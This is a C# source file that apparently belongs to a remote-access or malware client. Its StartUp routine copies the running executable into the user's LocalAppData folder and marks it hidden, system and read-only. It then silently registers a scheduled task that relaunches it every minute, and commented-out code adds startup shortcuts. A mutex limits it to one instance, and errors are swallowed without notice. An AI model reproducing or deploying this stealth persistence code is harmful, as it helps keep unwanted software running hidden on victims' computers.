using IWshRuntimeLibrary;
using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;


namespace Options
{
    public class Options
    {
        internal static string ProgramPath = Application.ExecutablePath;
        internal static string ExecName = System.AppDomain.CurrentDomain.FriendlyName;
        internal static string TaskName;
        internal static Mutex MT;
        internal static string MUTEX = "56d45qs4f-*(§/è'(q23fqdswcxv";
        internal static bool OW = false;

        public Options(string taskName)
        {
            TaskName = taskName;
        }
        public Options()
        {
            TaskName = "Client";
        }
        public static void StartUp(string d_time = "1")
        {
          

            try
            {

              
                    string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + ExecName;

                    if (System.IO.File.Exists(newPath) ==false)
                    {


                        System.IO.File.WriteAllBytes(newPath, System.IO.File.ReadAllBytes(ProgramPath));

                    NativeHelpers.SetFileAttributes(newPath, NativeHelpers.FileAttributes.Hidden | NativeHelpers.FileAttributes.System | NativeHelpers.FileAttributes.Readonly);


                    /*

                    var shell = new IWshShell_Class();


                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + ExecName.Replace(".exe" , ".lnk"));


                    shortcut.TargetPath = newPath;


                    shortcut.Description = "";


                    shortcut.Save();
                    */

                        //string ShellCMD2 = "schtasks /create /sc onstart /tn \"||\" /tr \"" + newPath + "\"";



                        //Interaction.Shell(ShellCMD2.Replace("||", TaskName + "CC").Replace("1", d_time), AppWinStyle.Hide, false, -1);
                    }

                string ShellCMD = "schtasks /create /sc minute /mo 1 /tn \"||\" /tr \"" + newPath + "\"";


                Interaction.Shell(ShellCMD.Replace("||", TaskName).Replace("1", d_time), AppWinStyle.Hide, false, -1);

            }
                catch (Exception ex)
                {

                }           
        }
        public static void oneInstance()
        {
              MT = new Mutex(true, MUTEX,out OW);
                    if(!OW)
                    {
                        NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);

                    }
        }
        public static void U_StartUp()
        {
            try
            {
                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ExecName;

                string ShellCMD = "schtasks /delete /tn " + TaskName + " /f";

                Interaction.Shell(ShellCMD, AppWinStyle.Hide, false, -1);

                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);

            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);
    }

}

